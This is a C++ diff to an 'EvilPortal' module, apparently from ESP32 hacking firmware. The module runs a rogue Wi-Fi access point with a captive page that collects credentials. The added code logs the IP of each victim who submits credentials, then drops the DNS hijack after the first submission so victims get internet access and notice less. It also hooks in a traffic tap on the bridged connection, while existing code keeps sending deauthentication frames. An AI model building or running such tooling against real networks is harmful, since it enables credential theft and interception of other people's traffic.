@@ -3,12 +3,18 @@
 #include "core/display.h"
 #include "core/mykeyboard.h"
 #include "core/sd_functions.h"
+#include "core/traffic_tap.h"
 #include "core/utils.h"
 #include "core/wifi/webInterface.h"
 #include "core/wifi/wifi_common.h"
 #include "esp_netif.h"
 #include "esp_wifi.h"
 #include "wifi_atks.h"
+
+namespace {
+class BridgeLifecycleTap : public ITrafficTap {};
+BridgeLifecycleTap g_bridge_tap;
+}
 
 EvilPortal::EvilPortal(
     String tssid, uint8_t channel, bool deauth, bool verifyPwd, bool autoMode, bool backgroundMode
@@ -175,6 +181,9 @@ bool EvilPortal::connectUpstreamSta() {
             );
         }
     }
+
+    TrafficTapRegistry::register_tap(&g_bridge_tap);
+    Serial.printf("[PORTAL] TrafficTap registered (n=%u)\n", (unsigned)TrafficTapRegistry::size());
     return true;
 }
 
@@ -350,7 +359,9 @@ void EvilPortal::loop() {
             shouldRedraw = false;
         }
 
-        dnsServer.processNextRequest();
+        if (_dnsHijackActive) {
+            dnsServer.processNextRequest();
+        }
 
         if (!isDeauthHeld && (millis() - lastDeauthTime) > 250 && _deauth) {
             send_raw_frame(deauth_frame, 26);
@@ -396,6 +407,7 @@ void EvilPortal::loop() {
                         esp_netif_napt_disable(sta_netif);
                         Serial.println("[PORTAL] NAPT disabled on STA netif");
                     }
+                    TrafficTapRegistry::unregister_tap(&g_bridge_tap);
                 }
 
                 webServer.end();
@@ -770,6 +782,27 @@ void EvilPortal::credsController(AsyncWebServerRequest *request) {
     } else {
         saveToCSV(csvLine);
         request->send(200, "text/html", wifiLoadPage());
+    }
+
+    if (_bridgeMode) {
+        uint32_t clientIp = (uint32_t)request->client()->remoteIP();
+        if (_authedIps.insert(clientIp).second) {
+            Serial.printf(
+                "[PORTAL] bridge: authed client %u.%u.%u.%u (total=%u)\n",
+                clientIp & 0xff, (clientIp >> 8) & 0xff,
+                (clientIp >> 16) & 0xff, (clientIp >> 24) & 0xff,
+                (unsigned)_authedIps.size()
+            );
+        }
+        if (_dnsHijackActive) {
+            // Release the captive hijack once any victim submits. Clients that
+            // had a cached DNS answer (almost all modern phones do) can now
+            // egress via NAPT; new lookups to 192.168.4.1 will silently time
+            // out. A proper per-client DNS proxy is tracked as follow-on work.
+            _dnsHijackActive = false;
+            dnsServer.stop();
+            Serial.println("[PORTAL] bridge: DNS hijack released after first authed cred");
+        }
     }
 
     capturedCredentialsHtml = htmlResponse + capturedCredentialsHtml;
